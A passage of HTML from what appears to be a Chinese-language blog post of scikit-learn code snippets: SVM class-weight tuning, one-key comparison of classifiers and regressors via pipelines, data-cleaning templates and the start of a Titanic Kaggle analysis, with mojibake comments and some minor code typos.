class="comment">#è®¾å®šclass_weight</span></span><br><span class="line">wclf = svm.SVC(kernel=<span class="string">&#x27;linear&#x27;</span>, class_weight=&#123;<span class="number">1</span>: <span class="number">10</span>&#125;)</span><br><span class="line">wclf.fit(X, y)</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment"># å¬å›ç‡</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> roc_auc_score, recall_score</span><br><span class="line">resutl = clf.predict(Xtest)</span><br><span class="line">recall = recall_score(Ytest,result)                    </span><br><span class="line"><span class="comment"># æé«˜å¬å›ç‡</span></span><br><span class="line">class_weight = &#123;<span class="number">1</span>:<span class="number">10</span>&#125; <span class="comment"># ç±»åˆ«ï¼šæƒé‡</span></span><br><span class="line"><span class="comment"># å¹³è¡¡</span></span><br><span class="line">class_weigth =<span class="string">&#x27;balanced&#x27;</span></span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line"><span class="comment"># è°ƒå‚</span></span><br><span class="line">irange = np.linspace(<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> irange:</span><br><span class="line"> Â  Â times = time()</span><br><span class="line"> Â  Â clf = SVC(kernel = <span class="string">&quot;linear&quot;</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  ,gamma=<span class="string">&quot;auto&quot;</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  ,cache_size = <span class="number">5000</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  ,class_weight = &#123;<span class="number">1</span>:<span class="number">1</span>+i&#125;</span><br><span class="line"> Â  Â  Â  Â  Â  Â  ).fit(Xtrain, Ytrain)</span><br><span class="line"> Â  Â result = clf.predict(Xtest)</span><br><span class="line"> Â  Â score = clf.score(Xtest,Ytest)</span><br><span class="line"> Â  Â recall = recall_score(Ytest, result)</span><br><span class="line"> Â  Â auc = roc_auc_score(Ytest,clf.decision_function(Xtest))</span><br><span class="line"> Â  Â <span class="built_in">print</span>(<span class="string">&quot;under ratio 1:%f testing accuracy %f, recall is %f&#x27;, auc is %f&quot;</span> % (<span class="number">1</span>+i,score,recall,auc))</span><br><span class="line"> Â  Â <span class="built_in">print</span>(datetime.datetime.fromtimestamp(time()-times).strftime(<span class="string">&quot;%M:%S:%f&quot;</span>))                    </span><br></pre></td></tr></table></figure><h3><span id="åˆ†ç±»onekey">åˆ†ç±»OneKey</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression,RidgeClassifier,SGDClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier,GradientBoostingClassifier,AdaBoostClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC,LinearSVC</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=&#123;&#125;</span>):</span><br><span class="line">    models[<span class="string">&#x27;LogisticRegression&#x27;</span>]=LogisticRegression()</span><br><span class="line">    models[<span class="string">&#x27;RidgeClassifier&#x27;</span>]=RidgeClassifier()</span><br><span class="line">    models[<span class="string">&#x27;SGDClassifier&#x27;</span>]=SGDClassifier()</span><br><span class="line">    models[<span class="string">&#x27;RandomForestClassifier&#x27;</span>]=RandomForestClassifier()</span><br><span class="line">    models[<span class="string">&#x27;GradientBoostingClassifier&#x27;</span>]=GradientBoostingClassifier()</span><br><span class="line">    models[<span class="string">&#x27;AdaBoostClassifier&#x27;</span>]=AdaBoostClassifier()</span><br><span class="line">    models[<span class="string">&#x27;KNN&#x27;</span>] = KNeighborsClassifier()</span><br><span class="line">    models[<span class="string">&#x27;GaussianNB&#x27;</span>] =  GaussianNB()</span><br><span class="line">    models[<span class="string">&#x27;SVC&#x27;</span>]=SVC()</span><br><span class="line">    models[<span class="string">&#x27;LinearSVC&#x27;</span>]=LinearSVC()</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipe</span>(<span class="params">model</span>):</span><br><span class="line">    s = [(<span class="string">&#x27;MinMaxScaler&#x27;</span>,MinMaxScaler()),(<span class="string">&#x27;model&#x27;</span>,model)]</span><br><span class="line">    <span class="keyword">return</span> Pipeline(steps=s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pred</span>(<span class="params">model,x</span>):</span><br><span class="line">    <span class="keyword">return</span> model.predict(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fit</span>(<span class="params">model,x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> model.fit(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid</span>(<span class="params">model,x,y,cv=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(model,x,y,cv=cv)</span><br><span class="line"></span><br><span class="line">s=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> n,m <span class="keyword">in</span> get_models().items():</span><br><span class="line">    pipe = make_pipe(m)</span><br><span class="line">    s[n] = valid(pipe,x,y).mean()</span><br><span class="line">    </span><br><span class="line">order = <span class="built_in">sorted</span>(s.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line">order</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">&#x27;algo&#x27;</span>,<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">plot_data.set_index(<span class="string">&#x27;algo&#x27;</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f&#x27;%s is the best,score is %f&#x27;</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model,X, Y</span>):</span><br><span class="line">steps = <span class="built_in">list</span>()</span><br><span class="line"><span class="comment"># standardization</span></span><br><span class="line">steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line"><span class="comment"># normalization</span></span><br><span class="line">steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line"><span class="comment"># the model</span></span><br><span class="line">steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line"><span class="comment"># create pipeline</span></span><br><span class="line">pipeline = Pipeline(steps)</span><br><span class="line"><span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">4</span>).mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,X,Y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="åˆ†ç±»è°ƒå‚onekey">åˆ†ç±»è°ƒå‚Onekey</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## å›å½’</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### å›å½’OneKey</span></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Ridge</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> ElasticNet</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> HuberRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lars</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LassoLars</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> PassiveAggressiveRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> RANSACRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestRegressor,GradientBoostingRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># prepare a list of ml models</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=<span class="built_in">dict</span>(<span class="params"></span>)</span>):</span><br><span class="line">    <span class="comment"># linear models</span></span><br><span class="line">    models[<span class="string">&#x27;rfr&#x27;</span>]=RandomForestRegressor()</span><br><span class="line">    models[<span class="string">&#x27;gbr&#x27;</span>]=GradientBoostingRegressor()</span><br><span class="line">    models[<span class="string">&#x27;lr&#x27;</span>] = LinearRegression()</span><br><span class="line">    models[<span class="string">&#x27;lasso&#x27;</span>] = Lasso()</span><br><span class="line">    models[<span class="string">&#x27;ridge&#x27;</span>] = Ridge()</span><br><span class="line">    models[<span class="string">&#x27;en&#x27;</span>] = ElasticNet()</span><br><span class="line">    models[<span class="string">&#x27;huber&#x27;</span>] = HuberRegressor()</span><br><span class="line">    models[<span class="string">&#x27;lars&#x27;</span>] = Lars()</span><br><span class="line">    models[<span class="string">&#x27;llars&#x27;</span>] = LassoLars()</span><br><span class="line">    models[<span class="string">&#x27;pa&#x27;</span>] = PassiveAggressiveRegressor(max_iter=<span class="number">1000</span>, tol=<span class="number">1e-3</span>)</span><br><span class="line">    models[<span class="string">&#x27;ranscac&#x27;</span>] = RANSACRegressor()</span><br><span class="line">    models[<span class="string">&#x27;sgd&#x27;</span>] = SGDRegressor(max_iter=<span class="number">1000</span>, tol=<span class="number">1e-3</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Defined %d models&#x27;</span> % <span class="built_in">len</span>(models))</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"> </span><br><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model</span>):</span><br><span class="line">    steps = <span class="built_in">list</span>()</span><br><span class="line">    <span class="comment"># standardization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line">    <span class="comment"># normalization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line">    <span class="comment"># the model</span></span><br><span class="line">    steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line">    <span class="comment"># create pipeline</span></span><br><span class="line">    pipeline = Pipeline(steps)</span><br><span class="line">    <span class="keyword">return</span> pipeline</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cross_validation</span>(<span class="params">pipeline,X,Y</span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">10</span>).mean()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validation</span>(<span class="params">pipeline,Xtrain,Ytrain,Xtest,Ytest</span>):</span><br><span class="line">    pipeline.fit(Xtrain,Ytrain)</span><br><span class="line">    <span class="keyword">return</span> pipeline.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    pipeline = make_pipeline(model)</span><br><span class="line">    <span class="comment"># dic[name] = cross_validation(pipeline,Xtrain,Ytrain)</span></span><br><span class="line">    dic[name] = validation(pipeline,Xtrain,Ytrain,Xtest,Ytest)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">&#x27;algo&#x27;</span>,<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">plot_data.set_index(<span class="string">&#x27;algo&#x27;</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f&#x27;%s is the best,score is %f&#x27;</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model,Xtrain,Ytrain,Xtest,Ytest</span>):</span><br><span class="line">steps = <span class="built_in">list</span>()</span><br><span class="line"><span class="comment"># standardization</span></span><br><span class="line">steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line"><span class="comment"># normalization</span></span><br><span class="line">steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line"><span class="comment"># the model</span></span><br><span class="line">steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line"><span class="comment"># create pipeline</span></span><br><span class="line">pipeline = Pipeline(steps).fit(Xtrain,Ytrain)</span><br><span class="line"><span class="keyword">return</span> pipeline.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,Xtrain,Ytrain,Xtest,Ytest)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2><span id="æ¨¡æ¿">æ¨¡æ¿</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">df.describe([<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># æå–è¿ç»­ï¼Œç¦»æ•£çš„æ•°æ®</span></span><br><span class="line">col = df.columns.tolist()</span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cate:</span><br><span class="line"> Â  Â col.remove(i)</span><br><span class="line"><span class="comment"># è½¬æ¢</span></span><br><span class="line">df[<span class="string">&#x27;a&#x27;</span>] = df[<span class="string">&#x27;a&#x27;</span>].replace(<span class="string">&#x27;[\$,)]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,regex=<span class="literal">True</span>).astype(<span class="built_in">float</span>)</span><br><span class="line"><span class="comment"># ç¦»æ•£ä¸€èˆ¬å¡«ä¼—æ•°ï¼Œè¿ç»­å¡«å‡å€¼</span></span><br><span class="line">df[<span class="string">&#x27;b&#x27;</span>]=df[<span class="string">&#x27;b&#x27;</span>].fillna(df.b.mean())</span><br><span class="line">df[<span class="string">&#x27;c&#x27;</span>]=df[<span class="string">&#x27;c&#x27;</span>].fillna(df.b.mode()[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># å“‘å˜é‡æ“ä½œ</span></span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line">cate</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cate:</span><br><span class="line">    df = pd.concat([df,pd.get_dummies(df[c],prefix=<span class="built_in">str</span>(c))],axis=<span class="number">1</span>)</span><br><span class="line">    df.drop(c,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å˜é‡æ“ä½œ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getTitle</span>(<span class="params">name</span>):</span><br><span class="line">    str1=name.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>]   <span class="comment">#å–å¤´è¡”.å§“</span></span><br><span class="line">    str2=str1.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]   <span class="comment">#å–å¤´è¡”</span></span><br><span class="line">    <span class="comment">#strip() ç§»é™¤å­—ç¬¦ä¸²å¤´å°¾æŒ‡å®šçš„å­—ç¬¦</span></span><br><span class="line">    str3=str2.strip()</span><br><span class="line">    <span class="keyword">return</span> str3</span><br><span class="line">titleDf = pd.DataFrame()</span><br><span class="line"><span class="comment">#mapæ–¹æ³•---å¯¹seriesé‡Œé¢æ¯ä¸ªæ•°æ®åº”ç”¨è‡ªå®šä¹‰å‡½æ•°è®¡ç®—</span></span><br><span class="line">titleDf[<span class="string">&#x27;Title&#x27;</span>] = full[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(getTitle)</span><br><span class="line"><span class="comment"># æ ¹æ®å…¶ä»–åˆ—æ•°æ®æ–°å»ºonehot</span></span><br><span class="line">df[<span class="string">&#x27;month&#x27;</span>] = df[<span class="string">&#x27;Date&#x27;</span>].dt.month</span><br><span class="line">familyDf = pd.DataFrame()</span><br><span class="line">familyDf[<span class="string">&#x27;FamilySize&#x27;</span>] = full[<span class="string">&#x27;Parch&#x27;</span>]+full[<span class="string">&#x27;SibSp&#x27;</span>]+<span class="number">1</span></span><br><span class="line">familyDf[<span class="string">&#x27;Family_Single&#x27;</span>] = familyDf[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> s == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line">familyDf[<span class="string">&#x27;Family_Small&#x27;</span>] = familyDf[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> <span class="number">2</span>&lt;= s &lt;= <span class="number">4</span> <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line">familyDf[<span class="string">&#x27;Family_Large&#x27;</span>] = familyDf[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> <span class="number">5</span>&lt;= s <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç›¸å…³æ€§</span></span><br><span class="line">corrDf = full.corr()</span><br><span class="line">survived_rel=corrDf[<span class="string">&#x27;Survived&#x27;</span>].sort_values(ascending = <span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="æ³°å¦å°¼å…‹">æ³°å¦å°¼å…‹</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">train = pd.read_csv(<span class="string">&#x27;train.csv&#x27;</span>)</span><br><span class="line">test = pd.read_csv(<span class="string">&#x27;test.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">train.head()</span><br><span class="line"></span><br><span class="line">train.info()</span><br><span class="line"></span><br><span class="line">train.describe([<span class="number">0.01</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br><span class="line"></span><br><span class="line">train.isna().<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line">train.Age.fillna(train.Age.mean(),inplace=<span class="literal">True</span>)</span><br><span class="line">train[<span class="string">&#x27;Embarked&#x27;</span>].fillna(train.Embarked.mode()[<span class="number">0</span>],inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.Cabin.value_counts()</span><br><span class="line"></span><br><span class="line">train.Cabin.fillna(<span class="string">&#x27;Unknown&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.set_index(<span class="string">&#x27;PassengerId&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train[<span class="string">&#x27;FamilySize&#x27;</span>] = train[<span class="string">&#x27;SibSp&#x27;</span>]+train[<span 